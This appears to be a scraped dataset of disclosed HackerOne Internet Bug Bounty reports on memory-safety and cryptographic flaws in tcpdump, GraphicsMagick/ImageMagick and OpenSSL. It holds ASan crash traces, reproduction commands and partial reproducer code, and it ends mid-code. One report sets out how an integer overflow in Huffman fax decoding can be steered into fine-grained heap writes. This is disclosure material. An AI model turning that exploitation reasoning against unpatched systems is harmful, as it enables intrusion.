9    #3 0x562a165bfb52 in tcp_print print-tcp.c:725
10    #4 0x562a1645f9e7 in ip_print_demux print-ip.c:396
11    #5 0x562a1645f9e7 in ip_print print-ip.c:673
12    #6 0x562a16413cef in ethertype_print print-ether.c:334
13    #7 0x562a164167e1 in ether_print print-ether.c:237
14    #8 0x562a164167e1 in ether_if_print print-ether.c:262
15    #9 0x562a1637b01e in pretty_print_packet print.c:332
16    #10 0x562a16353f8d in print_packet tcpdump.c:2590
17    #11 0x562a16627168 in pcap_offline_read savefile.c:561
18    #12 0x562a166160de in pcap_loop pcap.c:2737
19    #13 0x562a1634794d in main tcpdump.c:2093
20    #14 0x7f1aefe87b96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
21    #15 0x562a1634f969 in _start (/home/bhargava/work/github/tcpdump/tcpdump+0x17c969)
22
230x6070000000e2 is located 13 bytes to the right of 69-byte region [0x607000000090,0x6070000000d5)
24allocated by thread T0 here:
25    #0 0x7f1af054bb50 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb50)
26    #1 0x562a16627efa in pcap_check_header sf-pcap.c:404
27
28SUMMARY: AddressSanitizer: heap-buffer-overflow extract.h:190 in EXTRACT_32BITS
29Shadow bytes around the buggy address:
30  0x0c0e7fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
31  0x0c0e7fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
32  0x0c0e7fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
33  0x0c0e7fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
34  0x0c0e7fff8000: fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa
35=>0x0c0e7fff8010: fa fa 00 00 00 00 00 00 00 00 05 fa[fa]fa fa fa
36  0x0c0e7fff8020: fd fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa
37  0x0c0e7fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
38  0x0c0e7fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
39  0x0c0e7fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
40  0x0c0e7fff8060: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
41Shadow byte legend (one shadow byte represents 8 application bytes):
42  Addressable:           00
43  Partially addressable: 01 02 03 04 05 06 07 
44  Heap left redzone:       fa
45  Freed heap region:       fd
46  Stack left redzone:      f1
47  Stack mid redzone:       f2
48  Stack right redzone:     f3
49  Stack after return:      f5
50  Stack use after scope:   f8
51  Global redzone:          f9
52  Global init order:       f6
53  Poisoned by user:        f7
54  Container overflow:      fc
55  Array cookie:            ac
56  Intra object redzone:    bb
57  ASan internal:           fe
58  Left alloca redzone:     ca
59  Right alloca redzone:    cb
60==3569==ABORTING
It is acknowledged here(link: https://github.com/the-tcpdump-group/tcpdump/commit/83c64fce3a5226b080e535f5131a8a318f30e79b) that I (Bhargava Shastry) am the original reporter of the issue.
To prove that this hackerone account belongs to me, I have hosted a file with the following message on my github page(link: https://bshastry.github.io/.well-known/hackerone.txt)
Code 30 BytesWrap lines Copy Download1hello @turtle_shell @hackerone
If you have any further queries, please let me know.
Tracked as CVE-2017-13050: https://nvd.nist.gov/vuln/detail/CVE-2017-13050
Impact
I believe that information disclosure is possible.bags   posted a comment. Feb 23rd (3 years ago)Forgot to set severity while filing report: It should be high (similar to report #802846)ktistai   posted a comment. Feb 24th (3 years ago)Hi @bags,
Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
Kind regards,
@ktistaiktistai   updated the severity from none to high. Feb 27th (3 years ago)reed   closed the report and changed the status to Resolved. Jul 23rd (about 1 year ago)Hello @bags,
On behalf of the Internet Bug Bounty Panel, thank you for your continued patience on this report. The IBB is undergoing a review of all its in-scope projects and has decided to shut down this program indefinitely.
In an effort to reward researchers for their hard work and patience thus far, the IBB panel has elected to pay bounties to all valid reports at our minimum bounty amount.
As an act of good faith, we will also close this report as Resolved.
Thank you for helping keep the internet safe and secure!
-The Internet Bug Bounty PanelInternet Bug Bounty  rewarded bags with a $500 bounty. Jul 23rd (about 1 year ago)reed   requested to disclose this report. Jul 23rd (about 1 year ago)  This report has been disclosed. Aug 22nd (about 1 year ago)",https://hackerone.com/reports/802863,No value,No value,No value,2020,2,23,15,52
Internet Bug Bounty,1-10,1.0,No value,$500.00,Critical,9.8,Heap Overflow,CVE-2020-10938-buffer overflow/out-of-bounds write in compress.c:HuffmanDecodeImage(),"nathaniellives  submitted a report to Internet Bug Bounty.Mar 11th (3 years ago)Hello,
 There is an out-of-bounds write that is likely exploitable while performing Huffman decoding of Fax images.
The technical details are as follows.
Type: integer underflow produces out of bounds heap/etc write
Platform: 32-bit
Details:
Code 569 BytesWrap lines Copy Download1 390 MagickExport MagickPassFail HuffmanDecodeImage(Image *image)
2 391 {
3 392 const HuffmanTable
4 393 *entry;
5 394
6 [...]
7 412
8 413 long
9 414 count,
10 415 y;
11 416
12 [...]
13 420 register long
14 421 i,
15 422 x;
16 423
17 [...]
18 462 InitializeHashTable(mw_hash,TWTable,MWHashA,MWHashB);
19 463 InitializeHashTable(mw_hash,MWTable,MWHashA,MWHashB);
20 464 InitializeHashTable(mw_hash,EXTable,MWHashA,MWHashB);
21 465 InitializeHashTable(mb_hash,TBTable,MBHashA,MBHashB);
22 466 InitializeHashTable(mb_hash,MBTable,MBHashA,MBHashB);
23 467 InitializeHashTable(mb_hash,EXTable,MBHashA,MBHashB);
 Basic initialization; of specific note are that the variables 'x' and 'count' are signed. On a 64-bit
platform, assuming GCC or similar, it is 8 bytes in length and of course 4 bytes in length on 32-bit. There
is nothing inherently restricting this to 32-bit other than practicalities of the file size as there is a
need to have backing data to trigger the vulnerability. On 64-bit platforms this equates to a file size that
exceeds the default maximums, whereas on 32-bit the attached Proof-of-Concept out-of-bounds write trigger
only requires a file of a few megabytes-- which to my understanding can be reduced by wrapping the file in
compression.
 Additionally, the Huffman hash tables have code lengths that range between 0 and 2560.
Code 1.06 KiBWrap lines Copy Download1495 color=True;
2496 code=0;
3497 count=0;
4498 length=0;
5499 runlength=0;
6500 x=0;
7501 for ( ; ; )
8502 {
9503 if (byte == EOF)
10504 break;
11505 if (x >= (long) image->columns)
12506 {
13507 while (runlength < 11)
14508 InputBit(bit);
15509 do { InputBit(bit); } while (bit == 0);
16510 break;
17511 }
18512 bail=False;
19513 do
20514 {
21515 if (runlength < 11)
22516 InputBit(bit)
23517 else
24518 {
25519 InputBit(bit);
26520 if (bit)
27521 {
28522 null_lines++;
29523 if (x != 0)
30524 null_lines=0;
31525 bail=True;
32526 break;
33527 }
34528 }
35529 code=(code << 1)+bit;
36530 length++;
37531 } while (code <= 0);
38532 if (bail)
39533 break;
40534 if (length > 13)
41535 {
42536 while (runlength < 11)
43537 InputBit(bit);
44538 do
45539 {
46540 InputBit(bit);
47541 } while (bit == 0);
48542 break;
49543 }
50544 if (color)
51545 {
52546 if (length < 4)
53547 continue;
54548 entry=mw_hash[((length+MWHashA)*(code+MWHashB)) % HashSize];
55549 }
56550 else
57551 {
58552 if (length < 2)
59553 continue;
60554 entry=mb_hash[((length+MBHashA)*(code+MBHashB)) % HashSize];
61555 }
62556 if (!entry)
63557 continue;
64558 if ((entry->length != length) || (entry->code != code))
65559 continue;
 In the above code, we enter an unbounded for() loop at line 501, which terminates upon file EOF or other
abnormal condition. lines 513-531 unpack a huffman encoded pixel one bit at a time. Once the first binary 1
is encountered, the loop will always terminate until the total length of the code exceeds 13 or a
corresponding entry in the huffman tables are found at lines 548 or 554.
 In other words, we unpack the pixels and look them up in the huffman tables. Once we encounter a one, we
terminate the loop and attempt to look up the symbol in the corresponding tables matching the symbol length
and the symbol code. If we don't find a match, then we restart the loop and unpack another bit. This
continues until a symbol is found or a sequence of 11 or more zeros or 13 or more bits is encountered.
Code 471 BytesWrap lines Copy Download1 560 switch (entry->id)
2 561 {
3 562 case TWId:
4 563 case TBId:
5 564 {
6 565 count+=entry->count;
7 566 if ((x+count) > (long) image->columns)
8 567 count=(long) image->columns-x;
9 568 if (count > 0)
10 569 {
11 570 if (color)
12 571 {
13 572 x+=count;
14 573 count=0;
15 574 }
16 575 else
17 576 for ( ; count > 0; count--)
18 577 scanline[x++]=1;
19 578 }
20 579 color=!color;
21 580 break;
22 581 }
23 582 case MWId:
24 583 case MBId:
25 584 case EXId:
26 585 {
27 586 count+=entry->count;
28 587 break;
29 588 }
 When a symbol is found, we enter a jump table dependant upon the symbol type. The crux of the problem exists
in this section. The bounds check at line 566: ""if ((x+count) > (long) image->columns)"" is insufficient due
to the variables being signed, thus it becomes possible to:
1 Iterate across TWId or TBId symbols incrementing the value of x such that x is non-zero but less than
image->columns
2 Provide repeated instance of MWid, MBId or EXId symbols to iteratively work the ""count"" variable into a
value close to but not exceeding INT_MAX
3 Provide another TWId or TBId symbol causing an additive overflow at line 566.
4 Depending upon the state of the variable 'color', this will either result in:
⋅⋅4 The x variable becoming negative yielding an invalid offset at line 577; or
⋅⋅4 Resulting in an invalid value of count which exceeds the image->columns and thus bounding of scanline,
resulting in an out-of-bounds write at lines 577 and 578
Code 41 BytesWrap lines Copy Download1 592 code=0;
2 593 length=0;
3 594 }
4 [...]
Proof-of-Concept:
 Attached is a simple C++ program that when build (make; assuming g++ is in your path) and run will output a
file 'poc.fax' that can then be supplied to any code path that causes
ReadImage()->ReadFAXImage()->HuffmanDecodeImage() to be executed. It works the 'x' variable up to a value of
64, then the count variable up to INT_MAX - 64, then provides one of the symbols with a count length of 0 to
make x negative and then fetches a symbol that results in the out-of-bounds write.
Vendor Response
Justin,
This problem (and a number of other issues observed in compress.c) are
addressed by Mercurial changeset 16131:95abc2b694ce.
Thank you very much for your detailed report.
Bob
Impact
Exploitability:
 At first blush, this appears to be a wild out-of-bounds write with relatively little control. However, the
check at line 568 allows us a finer grained control over circumstances. Notably, it becomes possible to skip
over uncontrolled writes and toggle the color variable, the user can then supply additional MWId, MBId or
EXId symbols, causing the value of count to become non-negative, which in tandem with the color toggle
allows arbitrary modification of the x variable which in turn allows for a finer controlled write. The only
bounding is the maximum file size to be processed with each iteration taking approximately 1.3 megabytes of
huffman codes which can be compressed and should compress down nicely.
 In other words, you can set the value of x, then increment count into a negative value and toggle the color
variable back then increment count until its value is sane/positive again, and then re-enter the TWId/TBId
section thereby modifying the x variable again, then increment count into a negative and toggle color again
and overall repeat. This would ultimately allow writes as fine grained as a single byte immediately after or
immediately before the scanline buffer and within a certain range outside of that bounding. As this is heap
memory, it is thought to readily lend itself to exploitability.
 Finally, because this would allow for the modification of heap metadata, e.g. block sizes and similar,
because both the encoded and decoded data is user controlled without any real constraints and because all
code paths will trigger a free condition, exploitibility seems more a matter of academic interest than a
legitimate question.
 The specifics of this can be begrudingly worked out if required.1 attachment:F744093: fax_poc.tar.gz",https://hackerone.com/reports/816637,No value,No value,No value,2020,3,11,10,27
Internet Bug Bounty,1-10,1.0,No value,$500.00,High,8.6,Heap Overflow,Heap buffer overflow vulnerability while processing a malformed TIFF file.,"hardik05  submitted a report to Internet Bug Bounty.Nov 30th (2 years ago)A heap buffer overflow vulnerability occurs in magick while processing of a malformed TIFF file.Following is the version/build details:
Code 310 BytesWrap lines Copy Download1$ magick -version
2Version: ImageMagick 7.0.10-45 Q16 x86_64 2020-11-30 https://imagemagick.org
3Copyright: © 1999-2020 ImageMagick Studio LLC
4License: https://imagemagick.org/script/license.php
5Features: Cipher DPC HDRI OpenMP(4.5)
6Delegates (built-in): freetype jbig jng jpeg lcms lzma png raw tiff webp x zlib
Replication details:

run following command with attached poc.tif file:

Code 24 BytesWrap lines Copy Download1magick poc.tif /dev/null
note: zip file password is infected.
you should see the crash as mentioned below.
Following is the crash details:
Code 2.89 KiBWrap lines Copy Download1=21316==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6110000004f8 at pc 0x5638f9a55850 bp 0x7fffc92d67b0 sp 0x7fffc92d67a0
2READ of size 1 at 0x6110000004f8 thread T0
3    #0 0x5638f9a5584f in PushQuantumPixel MagickCore/quantum-import.c:256
4    #1 0x5638f9a5584f in ImportRGBQuantum MagickCore/quantum-import.c:4105
5    #2 0x5638f9b13e3d in ImportQuantumPixels MagickCore/quantum-import.c:4775
6    #3 0x5638f82186f4 in ReadTIFFImage coders/tiff.c:2025
7    #4 0x5638f8720e14 in ReadImage MagickCore/constitute.c:563
8    #5 0x5638f872e40c in ReadImages MagickCore/constitute.c:953
9    #6 0x5638fb49c996 in CLINoImageOperator MagickWand/operation.c:4853
10    #7 0x5638fb4aae31 in CLIOption MagickWand/operation.c:5350
11    #8 0x5638fae155ca in ProcessCommandOptions MagickWand/magick-cli.c:424
12    #9 0x5638fae1ec23 in MagickImageCommand MagickWand/magick-cli.c:796
13    #10 0x5638fae26a0e in MagickCommandGenesis MagickWand/mogrify.c:191
14    #11 0x5638f63ddab5 in MagickMain utilities/magick.c:149
15    #12 0x7f5d91238bf6 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21bf6)
16    #13 0x5638f63da6e9 in _start (/usr/local/bin/magick+0x20f26e9)
17
180x6110000004f8 is located 0 bytes to the right of 248-byte region [0x611000000400,0x6110000004f8)
19allocated by thread T0 here:
20    #0 0x7f5d94f5bb40 in __interceptor_malloc (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xdeb40)
21    #1 0x5638f655c2a8 in AcquireQuantumMemory MagickCore/memory.c:649
22
23SUMMARY: AddressSanitizer: heap-buffer-overflow MagickCore/quantum-import.c:256 in PushQuantumPixel
24Shadow bytes around the buggy address:
25  0x0c227fff8040: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa
26  0x0c227fff8050: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
27  0x0c227fff8060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
28  0x0c227fff8070: 06 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
29  0x0c227fff8080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
30=>0x0c227fff8090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00[fa]
31  0x0c227fff80a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
32  0x0c227fff80b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
33  0x0c227fff80c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
34  0x0c227fff80d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
35  0x0c227fff80e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
36Shadow byte legend (one shadow byte represents 8 application bytes):
37  Addressable:           00
38  Partially addressable: 01 02 03 04 05 06 07
39  Heap left redzone:       fa
40  Freed heap region:       fd
41  Stack left redzone:      f1
42  Stack mid redzone:       f2
43  Stack right redzone:     f3
44  Stack after return:      f5
45  Stack use after scope:   f8
46  Global redzone:          f9
47  Global init order:       f6
48  Poisoned by user:        f7
49  Container overflow:      fc
50  Array cookie:            ac
51  Intra object redzone:    bb
52  ASan internal:           fe
53  Left alloca redzone:     ca
54  Right alloca redzone:    cb
55==21316==ABORTING
Impact
can crash the software, may be remote code execution but i haven't checked the exploitability part of it.1 attachment:F1098584: poc.zip",https://hackerone.com/reports/1047086,No value,No value,No value,2020,11,30,13,54
Internet Bug Bounty,1-10,1.0,No value,$500.00,Critical,9.8,Classic Buffer Overflow,Several protocol parsers in before 4.9.2 could cause a buffer overflow in util-print.c:bittok2str_internal(),"bags  submitted a report to Internet Bug Bounty.Feb 20th (3 years ago)Length of a local buffer used to parse network packets was not validated against actual payload size leading to a classic buffer overflow.
P.S. I was not aware of this bounty program at the time of reporting. Is this report in scope? I have a few more reports that were originally sent to the tcpdump security mailing list, I could file a report for each of them here if that qualifies. I may have also helped fix some issues in 4.9.3 as well.
Impact
I believe remote DoS is possible. Remote code execution remains a possibility but I have not checked this myself.bags   posted a comment. Feb 20th (3 years ago)Here's the CVE: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-13011
Here's the fix acknowledging my report: https://github.com/the-tcpdump-group/tcpdump/commit/9f0730bee3eb65d07b49fd468bc2f269173352fe (please see commit log)h1_analyst_caesar HackerOne triage  changed the status to Needs more info. Feb 20th (3 years ago)Hi @bags, 
Thank you for the report! Unfortunately, we need a little more information from you before we can fully validate this report.
Please provide a detailed proof of concept that includes the following:

How to find the vulnerable functionality
Steps to reproduce the issue
any code snippets/curl commands/request and response headers that will help reproduce the issue
Any additional content such as screenshots/videos that will help demonstrate the vulnerability. 

Providing this information when submitting new reports will help us to quickly determine the validity of your report. Thank you for your help!
Regards,
@turtle_shellbags   changed the status to New. Feb 22nd (3 years ago)Hi @turtle_shell 
Please find the requested information inline

How to find the vulnerable functionality?

The vulnerable code portion is linked below. The linked function is responsible for printing payload information to the terminal (e.g., stdout)
https://github.com/the-tcpdump-group/tcpdump/blob/93493458ca50fa3fa45be20e2ed087a5dc2c594d/util-print.c#L540-L546

steps to reproduce the issue

The issue may be reproduced as follows

Check out vulnerable tcpdump commit (< 4.9.2) as follows

Code 100 BytesWrap lines Copy Download1$ git clone -b 93493458ca50fa3fa45be20e2ed087a5dc2c594d https://github.com/the-tcpdump-group/tcpdump

Build it with afl and AddressSanitizer as follows (please install libpcap before this step)

Code 37 BytesWrap lines Copy Download1$ CC=afl-gcc
2$ AFL_USE_ASAN=1 make -j

Run tcpdump against linked payload (link: https://github.com/the-tcpdump-group/tcpdump/blob/9f0730bee3eb65d07b49fd468bc2f269173352fe/tests/lldp_asan.pcap?raw=true)

Code 3.37 KiBWrap lines Copy Download1$ tcpdump -nvr <payload>
2reading from file /tmp/lldp_asan.pcap, link-type EN10MB (Ethernet)
3=================================================================
4==15231==ERROR: AddressSanitizer: global-buffer-overflow on address 0x559956f486c4 at pc 0x7fa55a772f09 bp 0x7ffd5fcbe990 sp 0x7ffd5fcbe120
5WRITE of size 17 at 0x559956f486c4 thread T0
6    #0 0x7fa55a772f08 in __interceptor_vsnprintf (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xa0f08)
7    #1 0x7fa55a773286 in snprintf (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xa1286)
8    #2 0x5599569aaa15 in bittok2str_internal util-print.c:542
9    #3 0x5599569aaa15 in bittok2str util-print.c:577
10    #4 0x559956888da0 in lldp_private_8023_print print-lldp.c:873
11    #5 0x559956888da0 in lldp_print print-lldp.c:1617
12    #6 0x5599567cc377 in ethertype_print print-ether.c:409
13    #7 0x5599567ced01 in ether_print print-ether.c:237
14    #8 0x5599567ced01 in ether_if_print print-ether.c:262
15    #9 0x559956733d0e in pretty_print_packet print.c:332
16    #10 0x55995670cc7d in print_packet tcpdump.c:2590
17    #11 0x5599569df118 in pcap_offline_read savefile.c:561
18    #12 0x5599569ce08e in pcap_loop pcap.c:2737
19    #13 0x55995670063d in main tcpdump.c:2093
20    #14 0x7fa55a0ecb96 in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x21b96)
21    #15 0x559956708659 in _start (/home/bhargava/work/github/tcpdump/tcpdump+0x17b659)
22
230x559956f486c4 is located 28 bytes to the left of global variable 'buf' defined in './util-print.c:508:14' (0x559956f486e0) of size 512
240x559956f486c4 is located 4 bytes to the right of global variable 'buf' defined in './util-print.c:526:21' (0x559956f485c0) of size 256
25  'buf' is ascii string '10BASE-T hdx, 10BASE-T fdx, 100BASE-T4, 100BASE-TX hdx, 100BASE-TX fdx, 100BASE-T2 hdx, 100BASE-T2 fdx, Pause for fdx links, Asym PAUSE for fdx, Sym PAUSE for fdx, Asym and Sym PAUSE for fdx, 1000BASE-{X LX SX CX} hdx, 1000BASE-{X LX SX CX} fdx, 1000BASE-'
26SUMMARY: AddressSanitizer: global-buffer-overflow (/usr/lib/x86_64-linux-gnu/libasan.so.4+0xa0f08) in __interceptor_vsnprintf
27Shadow bytes around the buggy address:
28  0x0ab3aade1080: 00 00 00 00 00 00 00 00 f9 f9 f9 f9 00 00 00 00
29  0x0ab3aade1090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
30  0x0ab3aade10a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
31  0x0ab3aade10b0: 00 00 00 00 f9 f9 f9 f9 00 00 00 00 00 00 00 00
32  0x0ab3aade10c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
33=>0x0ab3aade10d0: 00 00 00 00 00 00 00 00[f9]f9 f9 f9 00 00 00 00
34  0x0ab3aade10e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
35  0x0ab3aade10f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
36  0x0ab3aade1100: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
37  0x0ab3aade1110: 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9
38  0x0ab3aade1120: 04 f9 f9 f9 f9 f9 f9 f9 00 00 f9 f9 f9 f9 f9 f9
39Shadow byte legend (one shadow byte represents 8 application bytes):
40  Addressable:           00
41  Partially addressable: 01 02 03 04 05 06 07 
42  Heap left redzone:       fa
43  Freed heap region:       fd
44  Stack left redzone:      f1
45  Stack mid redzone:       f2
46  Stack right redzone:     f3
47  Stack after return:      f5
48  Stack use after scope:   f8
49  Global redzone:          f9
50  Global init order:       f6
51  Poisoned by user:        f7
52  Container overflow:      fc
53  Array cookie:            ac
54  Intra object redzone:    bb
55  ASan internal:           fe
56  Left alloca redzone:     ca
57  Right alloca redzone:    cb
58==15231==ABORTING

any code snippets/curl commands/request and response headers that will help reproduce the issue

tcpdump -nvr <payload>
is sufficient

Any additional content such as screenshots/videos that will help demonstrate the vulnerability.

It is acknowledged here(link: https://github.com/the-tcpdump-group/tcpdump/commit/9f0730bee3eb65d07b49fd468bc2f269173352fe) that I (Bhargava Shastry) am the original reporter of the issue.
To prove that this hackerone account belongs to me, I have hosted a file with the following message on my github page(link: https://bshastry.github.io/.well-known/hackerone.txt)
Code 30 BytesWrap lines Copy Download1hello @turtle_shell @hackerone
If you have any further queries, please let me know.bags   posted a comment. Apr 9th (2 years ago)Hello, any updates on this and other reports of mine for tcpdump :-)reed   closed the report and changed the status to Resolved. Jul 23rd (about 1 year ago)Hello @bags,
On behalf of the Internet Bug Bounty Panel, thank you for your continued patience on this report. The IBB is undergoing a review of all its in-scope projects and has decided to shut down this program indefinitely.
In an effort to reward researchers for their hard work and patience thus far, the IBB panel has elected to pay bounties to all valid reports at our minimum bounty amount.
As an act of good faith, we will also close this report as Resolved.
Thank you for helping keep the internet safe and secure!
-The Internet Bug Bounty PanelInternet Bug Bounty  rewarded bags with a $500 bounty. Jul 23rd (about 1 year ago)reed   requested to disclose this report. Jul 23rd (about 1 year ago)  This report has been disclosed. Aug 22nd (about 1 year ago)",https://hackerone.com/reports/800324,No value,No value,No value,2020,2,20,6,27
Internet Bug Bounty,1-10,1.0,No value,$500.00,Medium,5.45,Buffer Over-read,tcpdump before 4.9.3 has a heap-based buffer over-read related to aoe_print in print-aoe.c and lookup_emem in addrtoname.c,"dotsecurity  submitted a report to Internet Bug Bounty.Mar 25th (3 years ago)There seems to be a heap-based buffer overread while running tcpdump on a crafted pcap file. A similar behavior is seen when tcpdump is listening on an interface and the contents of this file is relayed over the network.
Please find the detailed report on github
https://github.com/the-tcpdump-group/tcpdump/issues/645
CVE: https://nvd.nist.gov/vuln/detail/CVE-2017-16808
Impact
Heap Over Read",https://hackerone.com/reports/831353,No value,No value,No value,2020,3,25,15,43
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,Memory Corruption - Generic,BN_hex2bn/BN_dec2bn NULL pointer deref/heap corruption (CVE-2016-0797),guido  submitted a report to Internet Bug Bounty.Mar 1st (7 years ago)https://openssl.org/news/secadv/20160301.txtInternet Bug Bounty  rewarded guido with a $500 bounty. Mar 27th (7 years ago)arice HackerOne staff  closed the report and changed the status to Resolved. Mar 27th (7 years ago)arice HackerOne staff  requested to disclose this report. Mar 27th (7 years ago)guido   agreed to disclose this report. Mar 27th (7 years ago)  This report has been disclosed. Mar 27th (7 years ago),https://hackerone.com/reports/119873,No value,No value,No value,2016,3,1,19,8
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",No value,0.0,Cryptographic Issues - Generic,BN_mod_exp may produce incorrect results on x86_64 (CVE-2015-3193),"hanno  submitted a report to Internet Bug Bounty.Apr 4th (7 years ago)For certain inputs OpenSSL's BN_mod_exp function (which is used for RSA and Diffie Hellman) can produce wrong results.
The issue has been fixed by OpenSSL and rated moderate severity:
https://openssl.org/news/secadv/20151203.txt
A code example is here:
https://github.com/hannob/bignum-fuzz/blob/master/CVE-2015-3193-openssl-vs-gcrypt-modexp.c
Some more info:
https://blog.fuzzing-project.org/31-Fuzzing-Math-miscalculations-in-OpenSSLs-BN_mod_exp-CVE-2015-3193.html",https://hackerone.com/reports/128169,No value,No value,No value,2016,4,4,11,54
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,Memory Corruption - Generic,CVE-2016-0799 memory issues in BIO_*printf functions,guido  submitted a report to Internet Bug Bounty.Feb 25th (7 years ago)https://github.com/openssl/openssl/commit/9cb177301fdab492e4cfef376b28339afe3ef663,https://hackerone.com/reports/118855,No value,No value,No value,2016,2,25,23,17
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,Memory Corruption - Generic,CVE-2016-2177 Undefined pointer arithmetic in SSL code,"guido  submitted a report to Internet Bug Bounty.Jun 1st (6 years ago)1.0.2 version here:
https://github.com/openssl/openssl/commit/a004e72b95835136d3f1ea90517f706c24c03da7
1.0.1 version here:
https://github.com/openssl/openssl/commit/6f35f6deb5ca7daebe289f86477e061ce3ee5f46
Code 103 BytesWrap lines Copy Download1These will get listed in the next security advisory and rolled up in the next release whenever that is.
according to the OpenSSL team.",https://hackerone.com/reports/142472,No value,No value,No value,2016,6,1,13,53
Internet Bug Bounty,1-10,1.0,No value,"$2,500.00",No value,0.0,Cryptographic Issues - Generic,Divide-and-conquer session key recovery in SSLv2 (CVE-2016-0703),"dadrian  submitted a report to Internet Bug Bounty.May 12th (7 years ago)This is a retroactive submission of CVE-2016-0703, a.k.a. the ""Extra Clear"" bug, which can lead to the Special DROWN variant of the DROWN attack. After some discussion with the other DROWN authors, I'm submitting on behalf of myself (David Adrian) and J. Alex Halderman the vulnerability CVE-2016-0703, which was acknowledged by OpenSSL as Sev:High at https://www.openssl.org/news/secadv/20160301.txt.",https://hackerone.com/reports/138179,No value,No value,No value,2016,5,12,5,53
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Medium,5.45,Denial of Service,CVE-2017-3730: Bad (EC)DHE parameters cause a client crash,"guido  submitted a report to Internet Bug Bounty.Jan 26th (6 years ago)https://www.openssl.org/news/secadv/20170126.txt
https://guidovranken.wordpress.com/2017/01/26/cve-2017-3730-openssl-1-1-0-remote-client-denial-of-service-affects-servers-as-well-poc/",https://hackerone.com/reports/201346,No value,No value,No value,2017,1,26,14,10
Internet Bug Bounty,1-10,1.0,No value,$500.00,Low,2.0,Denial of Service,Excessive allocation of memory in tls_get_message_header() (CVE-2016-6307),"theyarestone  submitted a report to Internet Bug Bounty.Apr 18th (6 years ago)A TLS message includes 3 bytes for its length in the header for the message.
This would allow for messages up to 16Mb in length. Messages of this length are
excessive and OpenSSL includes a check to ensure that a peer is sending
reasonably sized messages in order to avoid too much memory being consumed to
service a connection. A flaw in the logic of version 1.1.0 means that memory for
the message is allocated too early, prior to the excessive message length
check. Due to way memory is allocated in OpenSSL this could mean an attacker
could force up to 21Mb to be allocated to service a connection. This could lead
to a Denial of Service through memory exhaustion. However, the excessive message
length check still takes place, and this would cause the connection to
immediately fail. Assuming that the application calls SSL_free() on the failed
conneciton in a timely manner then the 21Mb of allocated memory will then be
immediately freed again. Therefore the excessive memory allocation will be
transitory in nature. This then means that there is only a security impact if:
1) The application does not call SSL_free() in a timely manner in the
event that the connection fails
or
2) The application is working in a constrained environment where there
is very little free memory
or
3) The attacker initiates multiple connection attempts such that there
are multiple connections in a state where memory has been allocated for
the connection; SSL_free() has not yet been called; and there is
insufficient memory to service the multiple requests.
Except in the instance of (1) above any Denial Of Service is likely to
be transitory because as soon as the connection fails the memory is
subsequently freed again in the SSL_free() call. However there is an
increased risk during this period of application crashes due to the lack
of memory - which would then mean a more serious Denial of Service.
This issue does not affect DTLS users.
refer:
https://www.openssl.org/news/secadv/20160922.txt",https://hackerone.com/reports/221791,No value,No value,No value,2017,4,18,7,41
Internet Bug Bounty,1-10,1.0,No value,"$2,500.00",High,7.5,Integer Overflow,Integer overflow in CipherUpdate,"reaperhulk  submitted a report to Internet Bug Bounty.Feb 27th (2 years ago)Summary:
I reported an integer overflow to the OpenSSL security list on Dec 13, 2020 and it was fixed in OpenSSL 1.1.1j. Reporting it here for the bounty. It was assigned CVE-2021-23840 (https://nvd.nist.gov/vuln/detail/CVE-2021-23840) which NVD rated CVSS 7.5. Amusingly, the same bug (worked around by my library pyca/cryptography before 1.1.1j was released) was assigned CVE-2020-36242 (https://nvd.nist.gov/vuln/detail/CVE-2020-36242), which received a 9.1 CVSS from NVD.
Steps To Reproduce:
The below is a reproducer for prior to 1.1.1j.
Code 883 BytesWrap lines Copy Download1#include <stdio.h>
2#include <stdlib.h>
3#include <assert.h>
4#include <openssl/evp.h>
5
6int main() {
7    int res;
8    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
9    assert(ctx != NULL);
10    unsigned char key[] = ""0000000000000000"";
11    unsigned char iv[] = ""0000000000000000"";
